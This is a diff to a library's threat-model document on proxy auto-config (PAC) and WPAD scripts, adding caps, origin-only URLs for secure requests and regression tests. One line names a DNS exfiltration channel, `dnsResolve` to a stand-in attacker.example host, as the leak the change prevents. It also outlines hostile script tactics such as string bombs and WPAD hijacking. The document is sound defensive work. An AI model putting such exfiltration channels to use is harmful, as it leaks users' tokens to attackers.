@@ -394,24 +394,44 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   one that is itself a public suffix gives `wpad.<that suffix>`, and a rogue DHCP server could hand out option 252
   anyway), then `http://wpad/wpad.dat` for the system resolver to complete; each candidate gets a share of the 5 s. An answer
   can pick only `DIRECT`, HTTP and SOCKS5; one naming only proxies the engine cannot use (`HTTPS`, `SOCKS4`) fails
-  closed (the next setting, else the request fails), never a silent direct connection. The origin's TLS and host-name
-  verification apply through any proxy (a PAC script cannot read or alter HTTPS traffic). What a script learns is the
-  URL it is passed (for `https` the scheme, host and port; for a WebSocket its URI with the resource name, as RFC 6455
-  §4.1 requires) and what it resolves through `dnsResolve`.
+  closed (the next setting, else the request fails), never a silent direct connection. An answer is at most 64 KiB of
+  ASCII (measured before it is copied out of the context); an entry that breaks the grammar (`DIRECT` with more after
+  it, a host that is no DNS name or IP address, a bad port) is skipped, and an answer with none left counts as a failed
+  script (the next setting, else direct: fail-open, as for any script that fails, and as browsers do). A script given
+  inline in the settings has the 1 MiB cap too. A run resolves at most 20 distinct names (Chromium's
+  `kMaxUniqueResolveDnsPerExec`); later new names give nothing without a lookup, which narrows `dnsResolve` as a channel
+  out and as an oracle of the internal network. A thrown value's text is copied out only when short. The origin's TLS
+  and host-name verification apply through any proxy (a PAC script cannot read or alter HTTPS traffic). What a script
+  learns is the URL it is passed and what it resolves through `dnsResolve`. For `https` and `wss` the URL is the origin
+  only (`wss://host[:port]/`), as Chrome (CVE-2016-5134), Android (CVE-2016-3763) and Firefox give it, so a token in a
+  path or query cannot leak through `dnsResolve("<data>.attacker.example")`; `ws` keeps its resource name (RFC 6455
+  §4.1; a `ws://` request is readable on the wire anyway) and `http` gives the origin. Only with
+  `pacFullWebSocketUrl`, and only for the script the settings name (never one WPAD found), does a `wss` URI reach the
+  script whole. The same URI rule holds on Windows, where WinHTTP runs the script.
 - **Residual (accepted):** the engine uses JavaScriptCore's public API only; the execution time limit of
   `JSContextGroupSetExecutionTimeLimit` is declared in a private header and was left out for App Review. So a hostile
   script (a PAC URL an attacker controls, or, on a LAN, whoever answers WPAD's DHCP option or `wpad.<domain>`, which
   needs no access to the device) can keep up to two threads busy at full CPU for as long as it runs, which for a script
   that never ends is until the process exits, and while it holds two, PAC is off and lookups use the next setting or a
-  direct connection. The memory a script allocates is bounded only by JavaScriptCore itself, not by the engine: a script
-  that allocates without end can grow the process until the system stops it. A script served by a WPAD hijacker can
+  direct connection. The memory a script allocates is bounded only by JavaScriptCore itself, not by the engine (its
+  public API has no heap limit): a string that doubles stops at JavaScriptCore's string length limit (a test pins it),
+  and deep recursion at its stack check, but a script that allocates without end (an array that grows) can grow the
+  process for up to the run's 2 s and on, on its abandoned thread, until it ends or the system stops the process; only
+  the time limit and the release of an abandoned thread's contexts bound it. With `pacFullWebSocketUrl` on, the script
+  the settings name sees `wss` paths and queries: an application turns it on only for a script it trusts, served over
+  `https` or as a file. A script served by a WPAD hijacker can
   send plain `http` and WebSocket `ws` traffic through a proxy of its choice, or direct, as on every platform that runs
   WPAD; `https` and `wss` stay protected by TLS to the origin.
 - **Verification:** `pac.PacEngineAppleTest.negative_theScriptHasNoHostAccess`, `.negative_runawayScriptIsAbandonedAndPacRecovers`,
   `.negative_slowDnsIsNotARunaway`, `.negative_queuedRunsAreNotRunaways`, `.negative_overrunAfterTheCallerGaveUpIsFoundByTheNextRun`,
   `.negative_oversizedScriptIsRefused`, `.negative_endlessScriptStopsAtTheCap`, `.negative_pacUrlThatHangsTimesOut`,
   `.negative_failedScriptFallsToTheNextEntry`, `.negative_unsupportedOnlyAnswerFailsClosed`, `.negative_wpadNeverTriesAPublicSuffix`,
-  `.negative_discoveredUrlIsHttpOnly`, `.answersAreParsed` (macOS); `ProxyResolverTest.negative_unsupportedOnlyPacAnswerFailsClosed`.
+  `.negative_discoveredUrlIsHttpOnly`, `.answersAreParsed`, `.negative_dnsLookupsAreCappedPerRun`, `.negative_hugeAnswerIsRefused`,
+  `.negative_malformedAnswersFail`, `.negative_malformedEntriesAreSkipped`, `.negative_deepRecursionFailsAndPacRecovers`,
+  `.negative_stringBombFailsAndPacRecovers`, `.negative_busyLoopIsAbandonedAndPacRecovers`, `.negative_oversizedInlineScriptIsRefused`,
+  `.negative_hugeThrownValueIsNotCopied`, `.negative_wssScriptsGetTheOriginUnlessTheSettingsNameThemAndTheAppOptsIn` (macOS);
+  `ProxyResolverTest.negative_unsupportedOnlyPacAnswerFailsClosed`, `.negative_pacTargetOfASecureUrlIsItsOriginOnly`,
+  `.negative_wpadScriptOnWindowsGetsTheOriginOnly`.
 
 ### 3.21 TCP peers that read slowly or not at all (JVM and Android)
 
